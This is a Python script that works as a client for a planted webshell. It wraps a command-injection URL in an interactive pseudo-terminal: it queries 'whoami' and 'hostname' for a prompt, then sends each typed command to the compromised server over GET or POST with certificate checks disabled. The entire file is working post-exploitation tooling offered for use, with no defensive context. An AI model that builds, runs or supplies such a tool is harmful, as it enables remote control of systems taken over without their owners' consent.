#!/usr/bin/python3

import requests
import argparse

# TO DO:
# - Configure Verbose Error Handling
# - Validate that the 'exit' string is properly capured to properly close the webshell function's loop

# Captures arguments from the user and executes the webshell() function.
def main():
    parser = argparse.ArgumentParser(description = "A Python script that connects to a webshell to create a sudo-interactive terminal session.", add_help=True)
    parser.add_argument("-u", "--url", type=str, required=True, help="The URL to connect to your webshell. This script will append your commands to the supplied string. For example, http://windowsforensics.net?cmd=\{Command\}.")
    parser.add_argument("-m", "--method", type=str, required=True, choices=["GET", "POST"], default="GET", help="The HTTP Request Method to use when interacting with your webshell.")
    args = parser.parse_args()
    webshell(args.url, args.method)

# Combines the URL with a command and returns a fully contructed URL as a string.
def create_request(url, command):
    payload = url + command
    return payload

# Creates a sudo-terminal like prompt by sending multiple requests to the webshell to identify the targeted user/endpoint.
def prompt(url, method):
    get_user = create_request(url, "whoami")
    get_hostname = create_request(url, "hostname")
    if method == "GET":
        user = requests.get(get_user, verify=False)
        hostname = requests.get(get_hostname, verify=False)
    else:
        user = requests.post(get_user, verify=False)
        hostname = requests.post(get_hostname, verify=False)
    user = user.content.decode().strip()
    hostname = hostname.content.decode().strip()
    shell = f"{user}@{hostname}\n--> "
    return shell

# Interact with the webshell, create a sudo-terminal prompt, send user input and return results.
def webshell(url, method):
    command = ""
    while command != "exit":
        shell = prompt(url, method)
        command = input(shell)
        user_input = create_request(url,command)
        if method == "GET":
            response = requests.get(user_input, verify=False)
        else:
            response = requests.post(user_input, verify=False)
        response = response.content.decode().strip()
        print(response + "\n")

if __name__ == "__main__":
    main()